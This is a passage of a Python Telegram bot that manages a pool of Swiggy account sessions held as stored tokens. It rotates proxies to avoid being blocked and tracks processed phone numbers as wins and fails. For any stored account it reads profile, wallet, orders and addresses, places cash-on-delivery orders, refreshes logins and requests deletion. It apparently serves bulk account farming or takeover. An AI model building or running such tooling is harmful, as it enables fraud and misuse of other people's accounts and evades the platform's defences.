        bot.answer_callback_query(call.id, f"✅ Loaded {len(new)}")
        _render_panel(chat_id, msg_id, "proxies", 0)
        return

    if action == "rotate_proxy":
        new = rotate_proxy()
        bot.answer_callback_query(
            call.id, f"🔄 {_short_proxy(new)}" if new else "❌ Empty pool"
        )
        _render_panel(chat_id, msg_id, "proxies", 0)
        return

    # ── FULL RESET ────────────────────────────────────────────────────────────
    if action == "full_reset":
        with USED_NUMBERS_LOCK:
            used_count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        STATS.update({"processed": 0, "wins": 0, "fails": 0, "skipped": 0})
        with LIVE_LOCK:
            LIVE_QUEUE.clear()
        with FAILED_PANELS_LOCK:
            FAILED_PANELS.clear()
        _DEAD_THIS_SCAN.clear()
        global LIVE_MSG_ID
        LIVE_MSG_ID = None
        save_store()
        bot.answer_callback_query(call.id, f"🔄 Reset! Cleared {used_count} used nums + stats")
        _render_panel(chat_id, msg_id, "home", 0)
        return

    # ── IMPORT ZIP (prompt) ───────────────────────────────────────────────────
    if action == "import_zip":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "📤 <b>Import Sessions from ZIP</b>\n\n"
            "Send a <code>.zip</code> file containing <code>sessions.json</code> "
            "or any <code>*.json</code> session files.\n\n"
            "Bot will merge them into your existing sessions (duplicates skipped).",
            parse_mode="HTML",
        )
        set_state(user_id, step="import_zip")
        return

    # ── RESET NEW SESSIONS FILE ───────────────────────────────────────────────
    if action == "reset_new_sessions":
        with _sessions_lock:
            _atomic_save(SESSIONS_NEW, [])
        bot.answer_callback_query(call.id, "🗑 sessions_new.json cleared")
        _render_panel(chat_id, msg_id, "sessions", 0)
        return

    bot.answer_callback_query(call.id)


# ═══════════════════════════════════════════════════════════════════════════════
# ACCOUNT OPERATIONS — per-session profile, orders, wallet, cart, checkout
#   callback namespace: acct:*
# ═══════════════════════════════════════════════════════════════════════════════

_ACCT_STATE: dict[int, dict] = {}
_ACCT_STATE_LOCK = threading.Lock()


def _acct_state(chat_id: int) -> dict:
    with _ACCT_STATE_LOCK:
        return dict(_ACCT_STATE.get(chat_id, {}))


def _acct_set(chat_id: int, **kw) -> None:
    with _ACCT_STATE_LOCK:
        _ACCT_STATE.setdefault(chat_id, {}).update(kw)


def _acct_account(idx: int):
    # The Accounts tab renders newest-first, so idx maps onto the reversed list.
    recs = _load_json_list(SESSIONS_FULL)
    ordered = list(reversed(recs))
    if 0 <= idx < len(ordered) and isinstance(ordered[idx], dict):
        px = current_proxy()
        if px and "resfix-in-nnid" in px:
            px = init_lls_session(px)
        return account_ops.Account(dict(ordered[idx]), proxy=px)
    return None


def _persist_session_update(mobile: str, updates: dict) -> bool:
    if not mobile:
        return False
    changed = False
    with _sessions_lock:
        fl = _load_json_list(SESSIONS_FULL)
        for s in fl:
            if str(s.get("mobile", "")).strip() == mobile:
                s.update(updates)
                changed = True
        if changed:
            _atomic_save(SESSIONS_FULL, fl)
        ml = _load_json_list(SESSIONS_MINIMAL)
        for s in ml:
            if str(s.get("mobile", "")).strip() == mobile:
                s.update({k: updates[k] for k in
                          ("token", "sid", "tid", "deviceId", "customerId") if k in updates})
        _atomic_save(SESSIONS_MINIMAL, ml)
    if changed:
        try:
            INDIVIDUAL_DIR.mkdir(exist_ok=True)
            p = INDIVIDUAL_DIR / f"{mobile}.json"
            d = json.loads(p.read_text(encoding="utf-8")) if p.exists() else {}
            d.update(updates)
            p.write_text(json.dumps(d, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception:
            pass
    return changed


def _acct_edit(chat_id: int, msg_id: int, text: str, kb=None) -> None:
    if len(text) > 4000:
        text = text[:3990] + "…"
    try:
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML",
                              reply_markup=kb, disable_web_page_preview=True)
    except Exception as e:
        if "message is not modified" in str(e).lower():
            return
        try:
            bot.send_message(chat_id, text, parse_mode="HTML",
                             reply_markup=kb, disable_web_page_preview=True)
        except Exception:
            pass


def _acct_run(chat_id: int, msg_id: int, label: str, work) -> None:
    try:
        bot.edit_message_text(f"⏳ <b>{_panel_esc(label)}</b>\n<i>talking to swiggy…</i>",
                              chat_id, msg_id, parse_mode="HTML")
    except Exception:
        pass

    def _worker():
        try:
            text, kb = work()
        except Exception as e:
            text, kb = f"❌ <code>{_panel_esc(e)}</code>", None
        _acct_edit(chat_id, msg_id, text, kb)

    threading.Thread(target=_worker, daemon=True).start()


def _acct_kb(chat_id: int, idx: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.row(ib("🔄 Refresh", f"acct:view:{idx}"), ib("✅ Verify", f"acct:verify:{idx}"))
    kb.row(ib("📦 Orders", f"acct:orders:{idx}"), ib("💰 Wallet", f"acct:wallet:{idx}"))
    kb.row(ib("📍 Addresses", f"acct:addrs:{idx}:im"), ib("🛒 Cart", f"acct:cart:{idx}:im"))
    kb.row(ib("💳 Checkout", f"acct:checkout:{idx}"), ib("🧹 Clear Cart", f"acct:clear:{idx}"))
    kb.row(ib("🛍 Shop (Instamart)", f"acct:shop:{idx}"), ib("🍔 Food menu", f"acct:food:{idx}"))
    kb.row(ib("🔑 Refresh Login", f"acct:refresh:{idx}"), ib("🚪 Logout", f"acct:logout:{idx}"))
    kb.row(ib("🗑 Delete Account", f"acct:del:{idx}"))
    kb.row(ib("⬅️ Accounts", "pnl:show:accounts:0"))
    return kb


def _acct_render_detail(chat_id: int, msg_id: int, idx: int) -> None:
    acc = _acct_account(idx)
    if not acc:
        _acct_edit(chat_id, msg_id, "❌ Account index is stale (sessions changed). Reopen the tab.",
                   types.InlineKeyboardMarkup().row(ib("⬅️ Accounts", "pnl:show:accounts:0")))
        return
    _acct_set(chat_id, idx=idx, viewing=True)
    m = acc.mobile

    def work():
        prof = acc.profile()
        p = prof.get("profile") or {}
        name = str(p.get("name") or p.get("userName") or "").strip()
        cid = str(p.get("customerId") or p.get("userId") or p.get("userid")
                  or acc.customer_id or "-")
        wal = acc.wallet()
        orders = acc.orders(count=5)
        olist = account_ops.extract_orders(orders)
        lines = [
            f"👤 <b>ACCOUNT</b> <code>+91{_panel_esc(m)}</code>",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"Name: <b>{_panel_esc(name or '-')}</b>",
            f"Customer: <code>{_panel_esc(cid)}</code>",
            f"Token: <code>{_panel_esc((acc.token[:12] + '…') if acc.has_token() else 'MISSING')}</code>",
            f"Device: <code>{_panel_esc(acc.model)}</code> · Android {_panel_esc(acc.os_ver)}",
            f"Profile: {'🟢 LIVE' if prof.get('ok') else '🔴 ' + _panel_esc(account_ops.summarize(prof))}",
            f"Money: <b>{wal.get('available_fmt') or ('—' if wal.get('ok') else account_ops.summarize(wal))}</b>",
        ]
        if olist:
            lines.append("\n<b>Recent orders</b>")
            for o in olist[:5]:
                lines.append("• " + _panel_esc(account_ops.format_order_line(o)))
        else:
            lines.append(f"\nOrders: <i>{'none' if orders.get('ok') else _panel_esc(account_ops.summarize(orders))}</i>")
        sel = _acct_state(chat_id).get("address_label")
        lines.append(f"\nSelected address: <code>{_panel_esc(sel or 'none')}</code>")
        return "\n".join(lines), _acct_kb(chat_id, idx)

    _acct_run(chat_id, msg_id, f"+91{m}", work)


def _acct_addresses(res: dict) -> list[dict]:
    d = res.get("data")
    lst: list = []
    if isinstance(d, list):
        lst = d
    elif isinstance(d, dict):
        for k in ("addresses", "data", "results", "items"):
            v = d.get(k)
            if isinstance(v, list):
                lst = v
                break
            if isinstance(v, dict):
                for k2 in ("addresses", "results", "items"):
                    if isinstance(v.get(k2), list):
                        lst = v[k2]
                        break
    out = []
    for a in lst:
        if not isinstance(a, dict):
            continue
        aid = str(a.get("addressId") or a.get("id") or a.get("address_id") or "")
        label = (a.get("addressTag") or a.get("label") or a.get("name")
                 or a.get("addressLine") or a.get("address") or "address")
        out.append({"id": aid, "label": str(label).strip()[:50]})
    return out


def _acct_products(res: dict) -> list[dict]:
    d = res.get("data")
    prods: list = []
    if isinstance(d, list):
        prods = d
    elif isinstance(d, dict):
        for k in ("products", "items", "results", "data"):
            v = d.get(k)
            if isinstance(v, list):
                prods = v
                break
            if isinstance(v, dict):
                for k2 in ("products", "items", "results"):
                    if isinstance(v.get(k2), list):
                        prods = v[k2]
                        break
    out = []
    for p in prods:
        if not isinstance(p, dict):
            continue
        name = str(p.get("name") or p.get("productName") or p.get("title") or "?")
        variants = p.get("variants") or p.get("skus") or []
        if not isinstance(variants, list) or not variants:
            variants = [p]
        for v in variants:
            if not isinstance(v, dict):
                continue
            spin = str(v.get("spinId") or v.get("spin") or p.get("spinId") or "")
            sku = str(v.get("skuId") or v.get("sku") or "")
            qty = v.get("quantity") or v.get("packSize") or v.get("size") or ""
            if spin:
                out.append({"spin": spin, "sku": sku,
                            "name": f"{name} {qty}".strip()[:48]})
    return out


def _handle_acct_callback(call: types.CallbackQuery) -> None:
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    parts = call.data.split(":")
    action = parts[1] if len(parts) > 1 else ""
    try:
        idx = int(parts[2])
    except (IndexError, ValueError):
        idx = -1

    if action == "view":
        bot.answer_callback_query(call.id)
        _acct_render_detail(chat_id, msg_id, idx)
        return

    acc = _acct_account(idx)
    if not acc:
        bot.answer_callback_query(call.id, "⚠️ stale account")
        return

    if action == "verify":
        bot.answer_callback_query(call.id, "🔍 checking…")
        def work():
            st = acc.alive()
            _persist_session_update(acc.mobile, {"sessionStatus": st,
                                                 "sessionStatusCheckedAt": now_iso()})
            return _acct_detail_after(chat_id, idx, st)
        _acct_run(chat_id, msg_id, f"verify +91{acc.mobile}", work)
        return

    if action == "orders":
        bot.answer_callback_query(call.id, "📦 fetching…")
        def work():
            res = acc.orders(count=20)
            olist = account_ops.extract_orders(res)
            if not olist:
                res2 = acc.order_history_native(count=20)
                olist = account_ops.extract_orders(res2)
                if not olist:
                    return (f"📦 <b>Orders</b>\n<i>{_panel_esc(account_ops.summarize(res))}</i>\n"
                            f"<pre>{_panel_esc(json.dumps(res.get('data'), ensure_ascii=False)[:1500])}</pre>",
                            _acct_kb(chat_id, idx))
            lines = [f"📦 <b>Orders</b> · <code>+91{_panel_esc(acc.mobile)}</code>", ""]
            for o in olist[:20]:
                lines.append("• " + _panel_esc(account_ops.format_order_line(o)))
            return "\n".join(lines), _acct_kb(chat_id, idx)
        _acct_run(chat_id, msg_id, f"orders +91{acc.mobile}", work)
        return

    if action == "wallet":
        bot.answer_callback_query(call.id, "💰 fetching…")
        def work():
            w = acc.wallet()
            e = acc.wallet_eligibility()
            lines = [f"💰 <b>Swiggy Money</b> · <code>+91{_panel_esc(acc.mobile)}</code>", ""]
            if w.get("ok"):
                lines.append(f"Available: <b>{w.get('available_fmt') or '—'}</b>")
            else:
                lines.append(f"Balance: ❌ {_panel_esc(account_ops.summarize(w))}")
            lines.append(f"Eligibility: {'ok' if e.get('ok') else _panel_esc(account_ops.summarize(e))}")
            return "\n".join(lines), _acct_kb(chat_id, idx)
        _acct_run(chat_id, msg_id, f"wallet +91{acc.mobile}", work)
        return

    if action == "addrs":
        domain = parts[3] if len(parts) > 3 else "im"
        bot.answer_callback_query(call.id, "📍 fetching…")
        def work():
            res = acc.addresses(domain)
            addrs = _acct_addresses(res)
            _acct_set(chat_id, addresses=addrs)
            kb = types.InlineKeyboardMarkup(row_width=1)
            for n, a in enumerate(addrs[:10]):
                kb.row(ib(f"📍 {a['label'] or a['id']}", f"acct:setaddr:{idx}:{n}"))
            kb.row(ib("⬅️ Back", f"acct:view:{idx}"))
            if not addrs:
                return (f"📍 <b>Addresses</b>\n<i>{'none' if res.get('ok') else _panel_esc(account_ops.summarize(res))}</i>",
                        kb)
            lines = [f"📍 <b>Addresses</b> · {len(addrs)}", ""]
            for a in addrs[:10]:
                lines.append(f"• <code>{_panel_esc(a['id'])}</code> {_panel_esc(a['label'])}")
            return "\n".join(lines), kb
        _acct_run(chat_id, msg_id, "addresses", work)
        return

    if action == "setaddr":
        n = _as_int(parts[3] if len(parts) > 3 else 0, 0)
        addrs = _acct_state(chat_id).get("addresses") or []
        if 0 <= n < len(addrs):
            _acct_set(chat_id, address_id=addrs[n]["id"], address_label=addrs[n]["label"])
            bot.answer_callback_query(call.id, f"✅ {addrs[n]['label'][:30]}")
        else:
            bot.answer_callback_query(call.id, "⚠️ stale list")
        _acct_render_detail(chat_id, msg_id, idx)
        return

    if action == "cart":
        domain = parts[3] if len(parts) > 3 else "im"
        bot.answer_callback_query(call.id, "🛒 fetching…")
        def work():
            aid = _acct_state(chat_id).get("address_id")
            res = acc.cart(domain, aid)
            body = json.dumps(res.get("data"), ensure_ascii=False, indent=1)[:2500] if res.get("data") else ""
            lines = [f"🛒 <b>Cart</b> · <code>+91{_panel_esc(acc.mobile)}</code>", ""]
            if res.get("ok"):
                lines.append("<pre>" + _panel_esc(body) + "</pre>")
            else:
                lines.append(f"❌ {_panel_esc(account_ops.summarize(res))}")
            return "\n".join(lines), _acct_kb(chat_id, idx)
        _acct_run(chat_id, msg_id, f"cart +91{acc.mobile}", work)
        return

    if action == "shop":
        bot.answer_callback_query(call.id)
        set_state(call.from_user.id, step="acct_search", idx=idx, chat_id=chat_id)
        bot.send_message(
            chat_id,
            f"🛍 <b>Instamart search</b> for <code>+91{_panel_esc(acc.mobile)}</code>\n\n"
            "Send a product name (e.g. <code>milk</code>).",
            parse_mode="HTML",
        )
        return

    if action == "food":
        bot.answer_callback_query(call.id)
        set_state(call.from_user.id, step="acct_food", idx=idx, chat_id=chat_id)
        bot.send_message(
            chat_id,
            "🍔 <b>Food menu</b>\n\nSend <code>restaurantId lat lng</code>\n"
            "e.g. <code>12345 12.9716 77.5946</code>",
            parse_mode="HTML",
        )
        return

    if action == "add":
        n = _as_int(parts[3] if len(parts) > 3 else 0, 0)
        prods = _acct_state(chat_id).get("search") or []
        if not (0 <= n < len(prods)):
            bot.answer_callback_query(call.id, "⚠️ stale results")
            return
        p = prods[n]
        aid = _acct_state(chat_id).get("address_id")
        if not aid:
            bot.answer_callback_query(call.id, "📍 pick an address first")
            return
        bot.answer_callback_query(call.id, "➕ adding…")
        def work():
            cur = acc.cart("im", aid)
            items = []
            for it in _acct_cart_items(cur):
                items.append(it)
            items.append({"spinId": p["spin"], "skuId": p["sku"], "quantity": 1})
            res = acc.update_cart(items, aid)
            return (f"➕ Added <b>{_panel_esc(p['name'])}</b>\n"
                    f"{'✅ cart updated' if res.get('ok') else '❌ ' + _panel_esc(account_ops.summarize(res))}",
                    _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "add to cart", work)
        return

    if action == "coupons":
        rid = parts[3] if len(parts) > 3 else ""
        aid = _acct_state(chat_id).get("address_id")
        if not aid:
            bot.answer_callback_query(call.id, "📍 pick an address first")
            return
        bot.answer_callback_query(call.id, "🎟 fetching…")
        def work():
            res = acc.fetch_food_coupons(aid, rid)
            body = json.dumps(res.get("data"), ensure_ascii=False)[:2000]
            return (f"🎟 <b>Coupons</b> · <code>{_panel_esc(rid)}</code>\n"
                    f"<pre>{_panel_esc(body)}</pre>", _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "coupons", work)
        return

    if action == "clear":
        bot.answer_callback_query(call.id, "🧹 clearing…")
        def work():
            res = acc.clear_cart()
            return (f"🧹 {'Cart cleared' if res.get('ok') else '❌ ' + _panel_esc(account_ops.summarize(res))}",
                    _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "clear cart", work)
        return

    if action == "checkout":
        aid = _acct_state(chat_id).get("address_id")
        if not aid:
            bot.answer_callback_query(call.id, "📍 pick an address first")
            return
        bot.answer_callback_query(call.id)
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.row(ib("💵 Cash/COD", f"acct:pay:{idx}:Cash"),
               ib("🟠 SwiggyPay", f"acct:pay:{idx}:SwiggyPay"))
        kb.row(ib("📲 UPI", f"acct:pay:{idx}:UPI"))
        kb.row(ib("⬅️ Back", f"acct:view:{idx}"))
        bot.edit_message_text(
            f"💳 <b>Checkout</b> · <code>+91{_panel_esc(acc.mobile)}</code>\n"
            f"Address: <code>{_panel_esc(_acct_state(chat_id).get('address_label') or aid)}</code>\n\n"
            "Pick a payment group. COD needs no app; UPI may require <code>intentApp</code> on this build.",
            chat_id, msg_id, parse_mode="HTML", reply_markup=kb,
        )
        return

    if action == "pay":
        method = parts[3] if len(parts) > 3 else "Cash"
        aid = _acct_state(chat_id).get("address_id")
        if not aid:
            bot.answer_callback_query(call.id, "📍 pick an address first")
            return
        bot.answer_callback_query(call.id, f"placing · {method}…")
        def work():
            res = acc.checkout(aid, payment_method=method)
            body = ""
            if isinstance(res.get("data"), dict):
                body = json.dumps(res["data"], ensure_ascii=False)[:1500]
            return (f"💳 <b>Checkout · {_panel_esc(method)}</b>\n"
                    f"{'✅ placed' if res.get('ok') else '❌ ' + _panel_esc(account_ops.summarize(res))}\n"
                    f"<pre>{_panel_esc(body)}</pre>", _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "placing order", work)
        return

    if action == "refresh":
        bot.answer_callback_query(call.id, "🔑 refreshing…")
        def work():
            res = acc.refresh_login()
            if res.get("token"):
                _persist_session_update(acc.mobile, {
                    "token": res["token"], "sid": res.get("sid") or acc.sid,
                    "tid": res.get("tid") or acc.tid,
                    "customerId": res.get("customerId") or acc.customer_id,
                })
                return (f"🔑 <b>Login refreshed</b> · <code>+91{_panel_esc(acc.mobile)}</code>\n"
                        f"New token: <code>{_panel_esc(res['token'][:14])}…</code>",
                        _acct_kb(chat_id, idx))
            return (f"🔑 <b>Refresh failed</b>\n<i>{_panel_esc(account_ops.summarize(res))}</i>\n"
                    f"<pre>{_panel_esc(json.dumps(res.get('data'), ensure_ascii=False)[:1200])}</pre>",
                    _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "refresh login", work)
        return

    if action == "logout":
        bot.answer_callback_query(call.id, "🚪 logging out…")
        def work():
            res = acc.logout()
            web_ok = (res.get("web") or {}).get("ok")
            nat_ok = (res.get("native") or {}).get("ok")
            ok = web_ok or nat_ok
            if ok:
                _persist_session_update(acc.mobile, {"sessionStatus": "LOGGED_OUT",
                                                     "sessionStatusCheckedAt": now_iso()})
            return (f"🚪 {'Logged out' if ok else '❌ log out failed'}\n"
                    f"<pre>{_panel_esc(json.dumps(res, ensure_ascii=False)[:1200])}</pre>",
                    _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "logout", work)
        return

    if action == "delete_check":
        bot.answer_callback_query(call.id, "🔎 checking…")
        def work():
            res = acc.delete_check()
            return (f"🔎 <b>Delete eligibility</b>\n"
                    f"<pre>{_panel_esc(json.dumps(res.get('data'), ensure_ascii=False)[:1500])}</pre>",
                    _acct_kb(chat_id, idx))
        _acct_run(chat_id, msg_id, "delete check", work)
        return

    if action == "del":
        bot.answer_callback_query(call.id)
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.row(ib("🔎 Check first", f"acct:delete_check:{idx}"))
        kb.row(ib("🗑 Yes, request OTP", f"acct:delconfirm:{idx}"),
               ib("❌ Cancel", f"acct:view:{idx}"))
        bot.edit_message_text(
            f"⚠️ <b>Delete account</b>\n<code>+91{_panel_esc(acc.mobile)}</code>\n\n"
            "Swiggy requires an OTP on the registered number. This is irreversible.",
            chat_id, msg_id, parse_mode="HTML", reply_markup=kb,
        )
        return

    if action == "delconfirm":
        bot.answer_callback_query(call.id)
        set_state(call.from_user.id, step="acct_delete_otp", idx=idx, chat_id=chat_id)
        bot.send_message(
            chat_id,
            f"🔐 Send the OTP received on <code>+91{_panel_esc(acc.mobile)}</code> "
            "to delete the account. /start to cancel.",
            parse_mode="HTML",
        )
        return

    bot.answer_callback_query(call.id)


def _acct_cart_items(cart_res: dict) -> list[dict]:
    """Pull existing {spinId, skuId, quantity} out of a get_cart response."""
    d = cart_res.get("data")
    items: list = []
    if isinstance(d, dict):
        for k in ("items", "cartItems", "products"):
            v = d.get(k)
            if isinstance(v, list):
                items = v
                break
            if isinstance(v, dict):
                for k2 in ("items", "cartItems"):
                    if isinstance(v.get(k2), list):
                        items = v[k2]
                        break
    out = []
    for it in items:
        if not isinstance(it, dict):
            continue
        spin = it.get("spinId") or it.get("spin") or (it.get("product") or {}).get("spinId")
        sku = it.get("skuId") or it.get("sku") or (it.get("product") or {}).get("skuId") or ""
        qty = it.get("quantity") or it.get("qty") or 1
        if spin:
            out.append({"spinId": str(spin), "skuId": str(sku), "quantity": int(qty or 1)})
    return out


def _acct_detail_after(chat_id: int, idx: int, status: str) -> tuple[str, Any]:
    acc = _acct_account(idx)
    mob = acc.mobile if acc else "?"
    return (f"✅ <b>Verified</b> · <code>+91{_panel_esc(mob)}</code>\nStatus: <b>{_panel_esc(status)}</b>",
            _acct_kb(chat_id, idx))




def _rich_dashboard() -> None:
    """Simple static terminal stats — no jumping/flickering."""
    if not RICH_AVAILABLE:
        return
    console = RichConsole()
    last_stats = ""

    while True:
        try:
            status = "🟢 RUNNING" if AUTO_RUNNING else "🔴 STOPPED"
            sess_count = len(_load_json_list(SESSIONS_FULL))
            px = current_proxy()
            px_label = "Direct" if not px else (px.split("@")[-1] if "@" in px else px)[:30]

            current = (
                f"{status} | W:{STATS['wins']} F:{STATS['fails']} S:{STATS['skipped']} "
                f"P:{STATS['processed']} | Sess:{sess_count} | {px_label}"
            )
            # Only print when changed — no flickering
            if current != last_stats:
                console.print(f"[bold cyan]📊 {current}[/]")
                last_stats = current
        except Exception:
            pass
        time.sleep(3)


def main() -> None:
    global _proxy_pool

    load_store()
    proxies = load_proxies()
    _proxy_pool.extend(proxies)

    if _proxy_pool:
        logger.info(f"🔀 Loaded {len(_proxy_pool)} proxies from {PROXIES_FILE}")
        # Quick proxy health check on startup
        logger.info("🧪 Testing proxies on startup…")
        for px in _proxy_pool:
            label = px.split("@")[-1] if "@" in px else px
            ok, result = test_proxy(px, timeout=8)
            if ok:
                logger.info(f"  ✅ {label} → {result}")
            else:
                logger.warning(f"  ❌ {label} → FAILED: {result}")
    else:
        logger.warning(f"⚠️  No proxies found in {PROXIES_FILE} — running direct (may get 403'd!)")

    logger.info(f"📋 {len(STORE.get('panels', []))} panels | {len(DISABLED_PANELS)} disabled")
    logger.info("🤖 Bot starting… (Ctrl+C to stop)")

    # Start simple terminal stats (no jumping)
    if RICH_AVAILABLE:
        t = threading.Thread(target=_rich_dashboard, daemon=True)
        t.start()

    # Keep open Telegram panels live while a scan runs
    threading.Thread(target=_panel_autorefresh, daemon=True).start()

    # Session keep-alive: checks every 30min, routes dead sessions to relogin queue
    threading.Thread(target=_session_keepalive_worker, daemon=True).start()

    try:
        bot.remove_webhook()
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except ApiTelegramException as e:
        if getattr(e, "error_code", None) == 409:
            logger.warning("⚠️ Bot already running elsewhere (409 conflict)")
        else:
            raise
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped")


if __name__ == "__main__":
    main()

